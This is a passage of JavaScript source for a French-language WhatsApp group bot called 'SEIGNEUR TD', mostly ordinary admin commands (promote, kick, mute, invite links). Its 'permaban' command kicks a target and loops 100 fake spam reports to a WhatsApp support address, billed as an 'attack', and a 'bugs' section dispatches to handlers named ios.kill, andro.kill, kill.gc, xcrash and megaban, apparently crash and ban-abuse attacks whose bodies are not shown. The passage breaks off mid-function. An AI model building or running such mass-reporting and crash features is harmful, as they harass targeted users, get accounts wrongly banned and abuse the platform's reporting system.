          await sock.sendMessage(remoteJid, { text: '⛔ Admin du groupe uniquement' });
          break;
        }

        const botIsAdminPromote = await isBotGroupAdmin(sock, remoteJid);
        if (!botIsAdminPromote) {
          await sock.sendMessage(remoteJid, { text: '❌ Je dois être admin pour promouvoir' });
          break;
        }

        const mentionedPromote = message.message?.extendedTextMessage?.contextInfo?.mentionedJid?.[0];
        if (!mentionedPromote) {
          await sock.sendMessage(remoteJid, {
            text: `Utilisation: ${config.prefix}promote @user`
          });
          break;
        }

        try {
          await sock.groupParticipantsUpdate(remoteJid, [mentionedPromote], 'promote');
          await sock.sendMessage(remoteJid, {
            text: `👑 @${mentionedPromote.split('@')[0]} est maintenant admin!`,
            mentions: [mentionedPromote]
          });
        } catch (error) {
          await sock.sendMessage(remoteJid, { text: '❌ Erreur lors de la promotion' });
        }
        break;

      case 'demote':
        if (!isGroup) {
          await sock.sendMessage(remoteJid, { text: '❌ This command is for groups only' });
          break;
        }
        
        const isUserAdminDemote = await isGroupAdmin(sock, remoteJid, senderJid);
        if (!isUserAdminDemote && !isAdminOrOwner()) {
          await sock.sendMessage(remoteJid, { text: '⛔ Admin du groupe uniquement' });
          break;
        }

        const botIsAdminDemote = await isBotGroupAdmin(sock, remoteJid);
        if (!botIsAdminDemote) {
          await sock.sendMessage(remoteJid, { text: '❌ Je dois être admin pour rétrograder' });
          break;
        }

        const mentionedDemote = message.message?.extendedTextMessage?.contextInfo?.mentionedJid?.[0];
        if (!mentionedDemote) {
          await sock.sendMessage(remoteJid, {
            text: `Utilisation: ${config.prefix}demote @user`
          });
          break;
        }

        try {
          await sock.groupParticipantsUpdate(remoteJid, [mentionedDemote], 'demote');
          await sock.sendMessage(remoteJid, {
            text: `📉 @${mentionedDemote.split('@')[0]} n'est plus admin`,
            mentions: [mentionedDemote]
          });
        } catch (error) {
          await sock.sendMessage(remoteJid, { text: '❌ Erreur lors de la rétrogradation' });
        }
        break;

      case 'add':
        if (!isGroup) {
          await sock.sendMessage(remoteJid, { text: '❌ This command is for groups only' });
          break;
        }
        
        const isUserAdminAdd = await isGroupAdmin(sock, remoteJid, senderJid);
        if (!isUserAdminAdd && !isAdminOrOwner()) {
          await sock.sendMessage(remoteJid, { text: '⛔ Admin du groupe uniquement' });
          break;
        }

        const botIsAdminAdd = await isBotGroupAdmin(sock, remoteJid);
        if (!botIsAdminAdd) {
          await sock.sendMessage(remoteJid, { text: '❌ Je dois être admin pour ajouter des membres' });
          break;
        }

        if (args.length === 0) {
          await sock.sendMessage(remoteJid, {
            text: `Utilisation: ${config.prefix}add 33612345678`
          });
          break;
        }

        const numberToAdd = args[0].replace(/[^0-9]/g, '');
        if (numberToAdd.length < 10) {
          await sock.sendMessage(remoteJid, { text: '❌ Numéro invalide' });
          break;
        }

        try {
          const jidToAdd = `${numberToAdd}@s.whatsapp.net`;
          await sock.groupParticipantsUpdate(remoteJid, [jidToAdd], 'add');
          await sock.sendMessage(remoteJid, {
            text: `✅ @${numberToAdd} a été ajouté au groupe`,
            mentions: [jidToAdd]
          });
        } catch (error) {
          await sock.sendMessage(remoteJid, { 
            text: `❌ Unable d'ajouter ce numéro\nVérifiez:\n- Le numéro est correct\n- La personne n'a pas quitté récemment\n- Les paramètres de confidentialité` 
          });
        }
        break;

      case 'kick':
        if (!isGroup) {
          await sock.sendMessage(remoteJid, { text: '❌ This command is for groups only' });
          break;
        }
        
        const isUserAdminKick = await isGroupAdmin(sock, remoteJid, senderJid);
        if (!isUserAdminKick && !isAdminOrOwner()) {
          await sock.sendMessage(remoteJid, { text: '⛔ Admin du groupe uniquement' });
          break;
        }

        const botIsAdminKick = await isBotGroupAdmin(sock, remoteJid);
        if (!botIsAdminKick) {
          await sock.sendMessage(remoteJid, { text: '❌ Je dois être admin pour expulser' });
          break;
        }

        const mentionedKick = message.message?.extendedTextMessage?.contextInfo?.mentionedJid?.[0];
        if (!mentionedKick) {
          await sock.sendMessage(remoteJid, {
            text: `Utilisation: ${config.prefix}kick @user`
          });
          break;
        }

        try {
          await sock.groupParticipantsUpdate(remoteJid, [mentionedKick], 'remove');
          await sock.sendMessage(remoteJid, {
            text: `👢 @${mentionedKick.split('@')[0]} a été expulsé`,
            mentions: [mentionedKick]
          });
        } catch (error) {
          await sock.sendMessage(remoteJid, { text: '❌ Erreur lors de l\'expulsion' });
        }
        break;

      case 'permaban':
        if (!isGroup) {
          await sock.sendMessage(remoteJid, { text: '❌ This command is for groups only' });
          break;
        }
        
        const isUserAdminPermaBan = await isGroupAdmin(sock, remoteJid, senderJid);
        if (!isUserAdminPermaBan && !isAdminOrOwner()) {
          await sock.sendMessage(remoteJid, { text: '⛔ Admin du groupe uniquement' });
          break;
        }

        const botIsAdminPermaBan = await isBotGroupAdmin(sock, remoteJid);
        if (!botIsAdminPermaBan) {
          await sock.sendMessage(remoteJid, { text: '❌ Je dois être admin pour bannir' });
          break;
        }

        const mentionedBan = message.message?.extendedTextMessage?.contextInfo?.mentionedJid?.[0];
        if (!mentionedBan) {
          await sock.sendMessage(remoteJid, {
            text: `⚠️ *PERMABAN - Bannissement Permanent*\n\nUtilisation:\n${config.prefix}permaban @user raison\n\nCette personne sera:\n• Expulsée du groupe\n• Signalée 100 fois à WhatsApp\n• Bloquée de rejoindre le groupe\n\n⚠️ Avertissement: Cette action est irréversible pour le signalement!\n\nCommandes liées:\n${config.prefix}unpermaban @user - Retirer le ban\n${config.prefix}banlist - Voir la liste des bannis`
          });
          break;
        }

        const banReason = args.slice(1).join(' ') || 'Comportement inapproprié';
        
        // Vérifier si déjà banni
        if (isPermaBanned(remoteJid, mentionedBan)) {
          await sock.sendMessage(remoteJid, {
            text: `⚠️ @${mentionedBan.split('@')[0]} est déjà banni définitivement!`,
            mentions: [mentionedBan]
          });
          break;
        }

        try {
          // Message d'avertissement
          await sock.sendMessage(remoteJid, {
            text: `╔═══════════════════════════════════╗
║    ⚠️ 𝗣𝗘𝗥𝗠𝗔𝗕𝗔𝗡 𝗔𝗖𝗧𝗜𝗩𝗔𝗧𝗘𝗗   ║
╚═══════════════════════════════════╝

🎯 Cible: @${mentionedBan.split('@')[0]}
📝 Raison: ${banReason}
⚡ Action: Expulsion + Signalement massif

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
⏳ Initialisation de l'attaque...
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━`,
            mentions: [mentionedBan]
          });

          await delay(2000);

          // Expulser la personne
          await sock.groupParticipantsUpdate(remoteJid, [mentionedBan], 'remove');
          
          // Ajouter au permaban
          addPermaBan(remoteJid, mentionedBan, banReason, senderJid);
          
          // Message de progression
          const progressMsg = await sock.sendMessage(remoteJid, {
            text: `⚡ *SIGNALEMENT EN COURS*\n\n📊 Progression: 0/100\n🎯 Cible: @${mentionedBan.split('@')[0]}\n\n⏳ Please patienter...`,
            mentions: [mentionedBan]
          });

          // SIGNALEMENT MASSIF - 100 fois
          let reportCount = 0;
          const totalReports = 100;
          const batchSize = 10; // Signaler par batch de 10

          for (let i = 0; i < totalReports; i += batchSize) {
            try {
              // Batch de signalement
              for (let j = 0; j < batchSize && (i + j) < totalReports; j++) {
                try {
                  // Envoyer le signalement à WhatsApp
                  await sock.sendMessage('support@s.whatsapp.net', {
                    text: `Report spam from ${mentionedBan}`
                  });
                  
                  reportCount++;
                } catch (reportErr) {
                  console.error('Erreur sending report:', reportErr);
                }
              }

              // Mise à jour de la progression toutes les 20 reports
              if (reportCount % 20 === 0 || reportCount === totalReports) {
                const percentage = Math.floor((reportCount / totalReports) * 100);
                const progressBar = '█'.repeat(Math.floor(percentage / 5)) + '░'.repeat(20 - Math.floor(percentage / 5));
                
                await sock.sendMessage(remoteJid, {
                  text: `⚡ *SIGNALEMENT EN COURS*\n\n📊 Progression: ${reportCount}/${totalReports}\n[${progressBar}] ${percentage}%\n🎯 Cible: @${mentionedBan.split('@')[0]}\n\n${reportCount === totalReports ? '✅ TERMINÉ!' : '⏳ En cours...'}`,
                  mentions: [mentionedBan],
                  edit: progressMsg.key
                });
              }

              // Délai pour éviter le rate limit
              if (i + batchSize < totalReports) {
                await delay(500);
              }
            } catch (error) {
              console.error('Erreur in report batch:', error);
            }
          }

          // Message final
          await sock.sendMessage(remoteJid, {
            text: `╔═══════════════════════════════════╗
║   ✅ 𝗣𝗘𝗥𝗠𝗔𝗕𝗔𝗡 𝗖𝗢𝗠𝗣𝗟𝗘𝗧   ║
╚═══════════════════════════════════╝

🎯 *Cible:* @${mentionedBan.split('@')[0]}
📝 *Raison:* ${banReason}
👤 *Par:* @${senderJid.split('@')[0]}
📅 *Date:* ${new Date().toLocaleString('fr-FR')}

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
✅ *ACTIONS EFFECTUÉES:*
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

1️⃣ Expulsion du groupe
2️⃣ ${reportCount} signalement envoyés à WhatsApp
3️⃣ Bannissement permanent activé

⚠️ Cette personne sera automatiquement expulsée si elle rejoint à nouveau.

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
    SEIGNEUR TD 🇷🇴
  "You remember me?"`,
            mentions: [mentionedBan, senderJid]
          });
          
          console.log(`✅ Permaban + ${reportCount} reports appliqués: ${mentionedBan} dans ${remoteJid}`);
        } catch (error) {
          console.error('Erreur in permaban:', error);
          await sock.sendMessage(remoteJid, { 
            text: '❌ Erreur lors du bannissement. La personne a peut-être déjà quitté le groupe.' 
          });
        }
        break;

      case 'unpermaban':
        if (!isGroup) {
          await sock.sendMessage(remoteJid, { text: '❌ This command is for groups only' });
          break;
        }
        
        const isUserAdminUnBan = await isGroupAdmin(sock, remoteJid, senderJid);
        if (!isUserAdminUnBan && !isAdminOrOwner()) {
          await sock.sendMessage(remoteJid, { text: '⛔ Admin du groupe uniquement' });
          break;
        }

        const mentionedUnBan = message.message?.extendedTextMessage?.contextInfo?.mentionedJid?.[0];
        if (!mentionedUnBan) {
          await sock.sendMessage(remoteJid, {
            text: `Utilisation: ${config.prefix}unpermaban @user`
          });
          break;
        }

        if (!isPermaBanned(remoteJid, mentionedUnBan)) {
          await sock.sendMessage(remoteJid, {
            text: `ℹ️ @${mentionedUnBan.split('@')[0]} n'est pas banni.`,
            mentions: [mentionedUnBan]
          });
          break;
        }

        const banInfo = getPermaBanInfo(remoteJid, mentionedUnBan);
        removePermaBan(remoteJid, mentionedUnBan);
        
        await sock.sendMessage(remoteJid, {
          text: `✅ *PERMABAN RETIRÉ*\n\n@${mentionedUnBan.split('@')[0]} peut à nouveau rejoindre le groupe.\n\nBanni depuis: ${new Date(banInfo.timestamp).toLocaleString('fr-FR')}\nRaison du ban: ${banInfo.reason}\nRetiré par: @${senderJid.split('@')[0]}`,
          mentions: [mentionedUnBan, senderJid]
        });
        
        console.log(`✅ Permaban retiré: ${mentionedUnBan} dans ${remoteJid}`);
        break;

      case 'banlist':
        if (!isGroup) {
          await sock.sendMessage(remoteJid, { text: '❌ This command is for groups only' });
          break;
        }

        const groupBans = getAllPermaBans(remoteJid);
        
        if (groupBans.length === 0) {
          await sock.sendMessage(remoteJid, {
            text: '✅ Aucune personne bannie dans ce groupe.'
          });
          break;
        }

        let banListText = `╔═══════════════════════════════════╗
║     🚫 𝗟𝗜𝗦𝗧𝗘 𝗗𝗘𝗦 𝗕𝗔𝗡𝗦     ║
╚═══════════════════════════════════╝

📊 Total: ${groupBans.length} personne(s) bannie(s)

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
`;

        groupBans.forEach((ban, index) => {
          const date = new Date(ban.timestamp).toLocaleDateString('fr-FR');
          banListText += `\n${index + 1}. @${ban.userJid.split('@')[0]}\n`;
          banListText += `   📝 Raison: ${ban.reason}\n`;
          banListText += `   📅 Date: ${date}\n`;
          banListText += `   👤 Par: @${ban.bannedBy.split('@')[0]}\n`;
        });

        banListText += `\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n`;
        banListText += `💡 Utilisez ${config.prefix}unpermaban @user pour retirer un ban`;

        const mentions = groupBans.flatMap(ban => [ban.userJid, ban.bannedBy]);

        await sock.sendMessage(remoteJid, {
          text: banListText,
          mentions: mentions
        });
        break;

      // =============================================
      // NOUVELLES COMMANDES GROUPE
      // =============================================

      case 'mute':
        if (!isGroup) {
          await sock.sendMessage(remoteJid, { text: '❌ This command is for groups only' });
          break;
        }
        
        const isUserAdminMute = await isGroupAdmin(sock, remoteJid, senderJid);
        if (!isUserAdminMute && !isAdminOrOwner()) {
          await sock.sendMessage(remoteJid, { text: '⛔ Admin du groupe uniquement' });
          break;
        }

        const botIsAdminMute = await isBotGroupAdmin(sock, remoteJid);
        if (!botIsAdminMute) {
          await sock.sendMessage(remoteJid, { text: '❌ Je dois être admin pour mute' });
          break;
        }

        try {
          await sock.groupSettingUpdate(remoteJid, 'announcement');
          await sock.sendMessage(remoteJid, {
            text: '🔇 Groupe en mode *MUET*\n\nSeuls les admins peuvent envoyer des messages.'
          });
        } catch (error) {
          await sock.sendMessage(remoteJid, { text: '❌ Erreur lors du mute' });
        }
        break;

      case 'unmute':
        if (!isGroup) {
          await sock.sendMessage(remoteJid, { text: '❌ This command is for groups only' });
          break;
        }
        
        const isUserAdminUnmute = await isGroupAdmin(sock, remoteJid, senderJid);
        if (!isUserAdminUnmute && !isAdminOrOwner()) {
          await sock.sendMessage(remoteJid, { text: '⛔ Admin du groupe uniquement' });
          break;
        }

        const botIsAdminUnmute = await isBotGroupAdmin(sock, remoteJid);
        if (!botIsAdminUnmute) {
          await sock.sendMessage(remoteJid, { text: '❌ Je dois être admin pour unmute' });
          break;
        }

        try {
          await sock.groupSettingUpdate(remoteJid, 'not_announcement');
          await sock.sendMessage(remoteJid, {
            text: '🔊 Groupe en mode *OUVERT*\n\nTout le monde peut envoyer des messages.'
          });
        } catch (error) {
          await sock.sendMessage(remoteJid, { text: '❌ Erreur lors du unmute' });
        }
        break;

      case 'invite':
      case 'lien':
        if (!isGroup) {
          await sock.sendMessage(remoteJid, { text: '❌ This command is for groups only' });
          break;
        }

        try {
          const inviteCode = await sock.groupInviteCode(remoteJid);
          await sock.sendMessage(remoteJid, {
            text: `🔗 *Lien d'invitation du groupe*\n\nhttps://chat.whatsapp.com/${inviteCode}`
          });
        } catch (error) {
          await sock.sendMessage(remoteJid, { 
            text: '❌ Unable de récupérer le lien. Je dois être admin.' 
          });
        }
        break;

      case 'revoke':
        if (!isGroup) {
          await sock.sendMessage(remoteJid, { text: '❌ This command is for groups only' });
          break;
        }
        
        const isUserAdminRevoke = await isGroupAdmin(sock, remoteJid, senderJid);
        if (!isUserAdminRevoke && !isAdminOrOwner()) {
          await sock.sendMessage(remoteJid, { text: '⛔ Admin du groupe uniquement' });
          break;
        }

        try {
          await sock.groupRevokeInvite(remoteJid);
          await sock.sendMessage(remoteJid, {
            text: '✅ Lien d\'invitation réinitialisé!\n\nL\'ancien lien ne fonctionne plus.'
          });
        } catch (error) {
          await sock.sendMessage(remoteJid, { 
            text: '❌ Erreur. Je dois être admin.' 
          });
        }
        break;

      case 'glock':
        if (!isGroup) {
          await sock.sendMessage(remoteJid, { text: '❌ This command is for groups only' });
          break;
        }
        
        const isUserAdminGlock = await isGroupAdmin(sock, remoteJid, senderJid);
        if (!isUserAdminGlock && !isAdminOrOwner()) {
          await sock.sendMessage(remoteJid, { text: '⛔ Admin du groupe uniquement' });
          break;
        }

        try {
          await sock.groupSettingUpdate(remoteJid, 'locked');
          await sock.sendMessage(remoteJid, {
            text: '🔒 Paramètres du groupe *VERROUILLÉS*\n\nSeuls les admins peuvent modifier les infos du groupe.'
          });
        } catch (error) {
          await sock.sendMessage(remoteJid, { text: '❌ Erreur' });
        }
        break;

      case 'gunlock':
        if (!isGroup) {
          await sock.sendMessage(remoteJid, { text: '❌ This command is for groups only' });
          break;
        }
        
        const isUserAdminGunlock = await isGroupAdmin(sock, remoteJid, senderJid);
        if (!isUserAdminGunlock && !isAdminOrOwner()) {
          await sock.sendMessage(remoteJid, { text: '⛔ Admin du groupe uniquement' });
          break;
        }

        try {
          await sock.groupSettingUpdate(remoteJid, 'unlocked');
          await sock.sendMessage(remoteJid, {
            text: '🔓 Paramètres du groupe *DÉVERROUILLÉS*\n\nTout le monde peut modifier les infos du groupe.'
          });
        } catch (error) {
          await sock.sendMessage(remoteJid, { text: '❌ Erreur' });
        }
        break;

      case 'gname':
        if (!isGroup) {
          await sock.sendMessage(remoteJid, { text: '❌ This command is for groups only' });
          break;
        }
        
        const isUserAdminGname = await isGroupAdmin(sock, remoteJid, senderJid);
        if (!isUserAdminGname && !isAdminOrOwner()) {
          await sock.sendMessage(remoteJid, { text: '⛔ Admin du groupe uniquement' });
          break;
        }

        if (args.length === 0) {
          await sock.sendMessage(remoteJid, {
            text: `Utilisation: ${config.prefix}gname <nouveau nom>`
          });
          break;
        }

        const newGroupName = args.join(' ');
        try {
          await sock.groupUpdateSubject(remoteJid, newGroupName);
          await sock.sendMessage(remoteJid, {
            text: `✅ Nom du groupe changé en:\n*${newGroupName}*`
          });
        } catch (error) {
          await sock.sendMessage(remoteJid, { text: '❌ Erreur' });
        }
        break;

      case 'gdesc':
        if (!isGroup) {
          await sock.sendMessage(remoteJid, { text: '❌ This command is for groups only' });
          break;
        }
        
        const isUserAdminGdesc = await isGroupAdmin(sock, remoteJid, senderJid);
        if (!isUserAdminGdesc && !isAdminOrOwner()) {
          await sock.sendMessage(remoteJid, { text: '⛔ Admin du groupe uniquement' });
          break;
        }

        if (args.length === 0) {
          await sock.sendMessage(remoteJid, {
            text: `Utilisation: ${config.prefix}gdesc <nouvelle description>`
          });
          break;
        }

        const newGroupDesc = args.join(' ');
        try {
          await sock.groupUpdateDescription(remoteJid, newGroupDesc);
          await sock.sendMessage(remoteJid, {
            text: `✅ Description du groupe modifiée!`
          });
        } catch (error) {
          await sock.sendMessage(remoteJid, { text: '❌ Erreur' });
        }
        break;

      case 'groupinfo':
      case 'infos':
        if (!isGroup) {
          await sock.sendMessage(remoteJid, { text: '❌ This command is for groups only' });
          break;
        }

        try {
          const metadata = await sock.groupMetadata(remoteJid);
          const admins = metadata.participants.filter(p => p.admin).length;
          const members = metadata.participants.length;
          const desc = metadata.desc || 'Aucune description';
          const owner = metadata.owner || 'Inconnu';
          const created = metadata.creation ? new Date(metadata.creation * 1000).toLocaleDateString('fr-FR') : 'Inconnu';

          await sock.sendMessage(remoteJid, {
            text: `╔═══════════════════════════════════╗
║      📊 𝗜𝗡𝗙𝗢𝗦 𝗚𝗥𝗢𝗨𝗣𝗘      ║
╚═══════════════════════════════════╝

📌 *Nom:* ${metadata.subject}

👥 *Membres:* ${members}
👑 *Admins:* ${admins}
🔐 *Créateur:* @${owner.split('@')[0]}
📅 *Créé le:* ${created}

📝 *Description:*
${desc}

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
    SEIGNEUR TD 🇷🇴`,
            mentions: [owner]
          });
        } catch (error) {
          await sock.sendMessage(remoteJid, { text: '❌ Erreur' });
        }
        break;

      case 'listonline':
        if (!isGroup) {
          await sock.sendMessage(remoteJid, { text: '❌ This command is for groups only' });
          break;
        }

        try {
          const metadata = await sock.groupMetadata(remoteJid);
          const participants = metadata.participants;
          
          let onlineList = `╔═══════════════════════════════════╗
║    📱 𝗠𝗘𝗠𝗕𝗥𝗘𝗦 𝗘𝗡 𝗟𝗜𝗚𝗡𝗘    ║
╚═══════════════════════════════════╝

`;

          let count = 0;
          for (const participant of participants) {
            try {
              const status = await sock.fetchStatus(participant.id);
              if (status) {
                count++;
                onlineList += `${count}. @${participant.id.split('@')[0]}\n`;
              }
            } catch (e) {
              // Ignore les erreurs
            }
          }

          onlineList += `\n📊 Total: ${count} membre(s) en ligne`;

          await sock.sendMessage(remoteJid, {
            text: onlineList,
            mentions: participants.map(p => p.id)
          });
        } catch (error) {
          await sock.sendMessage(remoteJid, { text: '❌ Erreur' });
        }
        break;

      case 'jid':
        const jidToShow = isGroup ? senderJid : remoteJid;
        await sock.sendMessage(remoteJid, {
          text: `📱 *Votre JID:*\n\n\`${jidToShow}\`\n\nCopiez-le pour l'utiliser comme admin.`
        });
        break;

      case 'quoted':
      case 'q':
        if (!message.message?.extendedTextMessage?.contextInfo?.quotedMessage) {
          await sock.sendMessage(remoteJid, { text: '❌ Réponds à un message' });
          break;
        }

        const quotedMsg = message.message.extendedTextMessage.contextInfo.quotedMessage;
        const quotedText = quotedMsg.conversation || quotedMsg.extendedTextMessage?.text || 'Message sans texte';
        
        await sock.sendMessage(remoteJid, {
          text: `📝 *Message cité:*\n\n${quotedText}`
        });
        break;

      case 'checkban':
      case 'bancheck':
      case 'isban':
        await handleCheckBan(sock, args, remoteJid, senderJid, message);
        break;

      // =============================================
      // COMMANDES BUGS 🪲
      // =============================================

      case 'kill.gc':
      case 'killgc':
        if (!isAdminOrOwner()) {
          await sock.sendMessage(remoteJid, { text: '⛔ Admins seulement' });
          break;
        }
        await handleKillGC(sock, args, remoteJid, senderJid, message);
        break;

      case 'ios.kill':
      case 'ioskill':
        if (!isAdminOrOwner()) {
          await sock.sendMessage(remoteJid, { text: '⛔ Admins seulement' });
          break;
        }
        await handleIOSKill(sock, args, remoteJid, senderJid, message);
        break;

      case 'andro.kill':
      case 'androkill':
      case 'androidkill':
        if (!isAdminOrOwner()) {
          await sock.sendMessage(remoteJid, { text: '⛔ Admins seulement' });
          break;
        }
        await handleAndroKill(sock, args, remoteJid, senderJid, message);
        break;

      case 'silent':
      case 'report':
        if (!isAdminOrOwner()) {
          await sock.sendMessage(remoteJid, { text: '⛔ Admins seulement' });
          break;
        }
        await handleSilent(sock, args, remoteJid, senderJid, message);
        break;

      case 'bansupport':
      case 'bansupp':
      case 'xban':
        if (!isAdminOrOwner()) {
          await sock.sendMessage(remoteJid, { text: '⛔ Admins seulement' });
          break;
        }
        await handleBanSupport(sock, args, remoteJid, senderJid, message);
        break;

      case 'xcrash':
      case 'megaban':
        if (!isAdminOrOwner()) {
          await sock.sendMessage(remoteJid, { text: '⛔ Admins seulement' });
          break;
        }
        await handleMegaBan(sock, args, remoteJid, senderJid, message);
        break;

      case 'updatedev':
      case 'devupdate':
      case 'managedev':
        if (!isAdminOrOwner()) {
          await sock.sendMessage(remoteJid, { text: '⛔ Admins seulement' });
          break;
        }
        await handleUpdateDev(sock, args, remoteJid, senderJid);
        break;

      case 'update':
      case 'maj':
      case 'upgrade': {
        if (!isAdminOrOwner()) {
          await sock.sendMessage(remoteJid, { text: '⛔ Admins du bot uniquement.' });
          break;
        }

        await sock.sendMessage(remoteJid, {
          text: '[ 🛰️ SYSTEM CHECK ]\nScan des serveurs en cours...'
        }, { quoted: message });

        try {
          const { execSync } = await import('child_process');
          const _cwd = process.cwd();

          // Vérifier si git est dispo et repo configuré
          let _gitReady = false;
          try {
            execSync('git status', { cwd: _cwd, stdio: 'ignore' });
            _gitReady = true;
          } catch(e) {}

          if (!_gitReady) {
            try {
              execSync(`git init`, { cwd: _cwd, stdio: 'ignore' });
              execSync(`git remote add origin https://github.com/Azountou235/SEIGNEUR-TD-.git`, { cwd: _cwd, stdio: 'ignore' });
              _gitReady = true;
            } catch(e) {
              try {
                execSync(`git remote set-url origin https://github.com/Azountou235/SEIGNEUR-TD-.git`, { cwd: _cwd, stdio: 'ignore' });
                _gitReady = true;
              } catch(e2) {}
            }
          }

          if (!_gitReady) {
            await sock.sendMessage(remoteJid, { text: '⚠️ Rapport d\'erreur ? Contactez l\'administrateur : +235 91234568\nSYNC TERMINÉE. 😀 🇷🇴 💗' });
            break;
          }

          // Fetch silencieux pour détecter changements
          let _hasUpdates = false;
          try {
            execSync('git fetch origin main 2>&1 || git fetch origin master 2>&1', { cwd: _cwd, shell: true, timeout: 15000 });
            const _status = execSync('git status', { cwd: _cwd, encoding: 'utf8' });
            _hasUpdates = _status.includes('behind') || _status.includes('diverged');
          } catch(e) { _hasUpdates = true; } // en cas d'erreur on tente quand même

          if (!_hasUpdates) {
            await sock.sendMessage(remoteJid, {
              text: '📁 Statut : Aucun nouveau fichier trouvé. Votre version est déjà optimale.\n⚠️ Rapport d\'erreur ? Contactez l\'administrateur : +235 91234568\nSYNC TERMINÉE. 😀 🇷🇴 💗'
            });
            break;
          }

          await sock.sendMessage(remoteJid, { text: '📥 Mise à jour détectée ! Téléchargement des paquets... 🤳' });

          execSync('git pull origin main 2>&1 || git pull origin master 2>&1', {
            cwd: _cwd, shell: true, encoding: 'utf8', timeout: 60000
          });

          try { execSync('npm install --production 2>&1', { cwd: _cwd, encoding: 'utf8', timeout: 60000 }); } catch(e) {}

          await sock.sendMessage(remoteJid, { text: '✅ *MISE À JOUR RÉUSSIE !*\n🔄 Redémarrage dans 3s...\n🇷🇴 SEIGNEUR TD' });

          setTimeout(async () => {
            try { await sock.end(); } catch(e) {}
            await delay(1000);
            connectToWhatsApp();
          }, 3000);

        } catch(e) {
          console.error('[UPDATE]', e.message);
          await sock.sendMessage(remoteJid, { text: '⚠️ Rapport d\'erreur ? Contactez l\'administrateur : +235 91234568\nSYNC TERMINÉE. 😀 🇷🇴 💗' });
        }
        break;
      }

            case 'storestatus':
      case 'storeinfo':
      case 'storesave':
        if (!isAdminOrOwner()) {
          await sock.sendMessage(remoteJid, { text: '⛔ Admins seulement' });
          break;
        }
        await handleStoreStatus(sock, remoteJid, command);
        break;

      // =============================================
      // NOUVELLES COMMANDES OWNER
      // =============================================

      case 'block':
        if (!isAdminOrOwner()) {
          await sock.sendMessage(remoteJid, { text: '⛔ Admins seulement' });
          break;
        }

        const mentionedBlock = message.message?.extendedTextMessage?.contextInfo?.mentionedJid?.[0];
        if (!mentionedBlock) {
          await sock.sendMessage(remoteJid, {
            text: `Utilisation: ${config.prefix}block @user`
          });
          break;
        }

        try {
          await sock.updateBlockStatus(mentionedBlock, 'block');
          await sock.sendMessage(remoteJid, {
            text: `🚫 @${mentionedBlock.split('@')[0]} a été bloqué!`,
            mentions: [mentionedBlock]
          });
        } catch (error) {
          await sock.sendMessage(remoteJid, { text: '❌ Erreur' });
        }
        break;

      case 'unblock':
        if (!isAdminOrOwner()) {
          await sock.sendMessage(remoteJid, { text: '⛔ Admins seulement' });
          break;
        }

        const mentionedUnblock = message.message?.extendedTextMessage?.contextInfo?.mentionedJid?.[0];
        if (!mentionedUnblock) {
          await sock.sendMessage(remoteJid, {
            text: `Utilisation: ${config.prefix}unblock @user`
          });
          break;
        }

        try {
          await sock.updateBlockStatus(mentionedUnblock, 'unblock');
          await sock.sendMessage(remoteJid, {
            text: `✅ @${mentionedUnblock.split('@')[0]} a été débloqué!`,
            mentions: [mentionedUnblock]
          });
        } catch (error) {
          await sock.sendMessage(remoteJid, { text: '❌ Erreur' });
        }
        break;

      case 'join':
        if (!isAdminOrOwner()) {
          await sock.sendMessage(remoteJid, { text: '⛔ Admins seulement' });
          break;
        }

        if (args.length === 0) {
          await sock.sendMessage(remoteJid, {
            text: `Utilisation: ${config.prefix}join <lien du groupe>`
          });
          break;
        }

        const inviteLink = args[0].replace('https://chat.whatsapp.com/', '');
        try {
          await sock.groupAcceptInvite(inviteLink);
          await sock.sendMessage(remoteJid, {
            text: '✅ Bot a rejoint le groupe!'
          });
        } catch (error) {
          await sock.sendMessage(remoteJid, { text: '❌ Lien invalide ou erreur' });
        }
        break;

      case 'pp':
        if (!isAdminOrOwner()) {
          await sock.sendMessage(remoteJid, { text: '⛔ Admins seulement' });
          break;
        }

        if (!message.message?.imageMessage && !message.message?.extendedTextMessage?.contextInfo?.quotedMessage?.imageMessage) {
          await sock.sendMessage(remoteJid, {
            text: '❌ Envoie ou réponds à une image'
          });
          break;
        }

        try {
          const imageMsg = message.message?.imageMessage || message.message?.extendedTextMessage?.contextInfo?.quotedMessage?.imageMessage;
          const stream = await downloadContentFromMessage(imageMsg, 'image');
          const buffer = await toBuffer(stream);
          
          await sock.updateProfilePicture(sock.user.id, buffer);
          await sock.sendMessage(remoteJid, {
            text: '✅ Photo de profil du bot mise à jour!'
          });
        } catch (error) {
          await sock.sendMessage(remoteJid, { text: '❌ Erreur' });
        }
        break;

      case 'gpp':
        if (!isGroup) {
          await sock.sendMessage(remoteJid, { text: '❌ This command is for groups only' });
          break;
        }

        const isUserAdminGpp = await isGroupAdmin(sock, remoteJid, senderJid);
        if (!isUserAdminGpp && !isAdminOrOwner()) {
          await sock.sendMessage(remoteJid, { text: '⛔ Admin du groupe uniquement' });
          break;
        }

        if (!message.message?.imageMessage && !message.message?.extendedTextMessage?.contextInfo?.quotedMessage?.imageMessage) {
          await sock.sendMessage(remoteJid, {
            text: '❌ Envoie ou réponds à une image'
          });
          break;
        }

        try {
          const imageMsg = message.message?.imageMessage || message.message?.extendedTextMessage?.contextInfo?.quotedMessage?.imageMessage;
          const stream = await downloadContentFromMessage(imageMsg, 'image');
          const buffer = await toBuffer(stream);
          
          await sock.updateProfilePicture(remoteJid, buffer);
          await sock.sendMessage(remoteJid, {
            text: '✅ Photo de profil du groupe mise à jour!'
          });
        } catch (error) {
          await sock.sendMessage(remoteJid, { text: '❌ Erreur. Je dois être admin.' });
        }
        break;

      case 'delete':
      case 'del':
        const isUserAdminDelete = isGroup ? await isGroupAdmin(sock, remoteJid, senderJid) : true;
        if (!isUserAdminDelete && !isAdminOrOwner()) {
          await sock.sendMessage(remoteJid, { text: '⛔ Admin only' });
          break;
        }

        if (!message.message?.extendedTextMessage?.contextInfo?.quotedMessage) {
          await sock.sendMessage(remoteJid, { text: '❌ Répondez au message à supprimer' });
          break;
        }

        try {
          const quotedMsgKey = message.message.extendedTextMessage.contextInfo;
          await sock.sendMessage(remoteJid, { 
            delete: {
              remoteJid: remoteJid,
              fromMe: false,
              id: quotedMsgKey.stanzaId,
              participant: quotedMsgKey.participant
            }
          });
        } catch (error) {
